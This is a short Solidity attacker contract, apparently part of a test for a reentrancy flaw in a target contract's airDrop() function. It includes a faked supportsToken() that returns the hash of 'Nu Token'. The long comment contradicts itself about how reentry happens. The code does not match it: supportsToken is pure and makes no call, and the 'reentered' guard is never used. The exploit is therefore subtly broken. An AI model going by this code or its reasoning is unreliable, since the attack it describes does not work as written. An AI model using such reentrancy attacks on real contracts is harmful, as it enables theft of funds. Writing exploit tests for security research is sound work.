    C immutable target;
    address immutable victim;
    bool reentered;

    constructor(C _target, address _victim) {
        target = _target;
        victim = _victim;
        reentered = false;
    }

    // make c believe this contract supports the token
    function supportsToken() external pure returns (bytes32) {
        return keccak256(abi.encodePacked("Nu Token"));
    }

    // entry point invoked by the test (pranked so tx.origin differs but msg.sender is this contract)
    function callAirDrop() external {
        // call airDrop; during airDrop execution, if the target is vulnerable (no lock), the attacker will attempt to reenter via fallback triggered by sending gasless call or via calling back from a receive or fallback.
        // We'll call airDrop and rely on our fallback to be invoked if target makes an external call to msg.sender; however the reference does not call external, but the vulnerability is reentrancy via fallback when manipulating state — to ensure we can reenter, we proactively in this contract call target.airDrop() inside a fallback triggered by sending to ourselves. Simpler: call target.airDrop() directly; if vulnerable (no lock) the attacker can call target.airDrop() again from within supportsToken() — but supportsToken is view-only. Instead, we exploit that target.airDrop() calls Bank(msg.sender).supportsToken() which is executed before state changes; during that external call, it's inside target.airDrop(), so if supportsToken() triggers a reentrant call back to airDrop, it will be nested.
        // Our supportsToken implementation can perform a reentrant call when invoked by target.airDrop(). To enable that, reentered flag guards recursion.
        target.airDrop();
    }

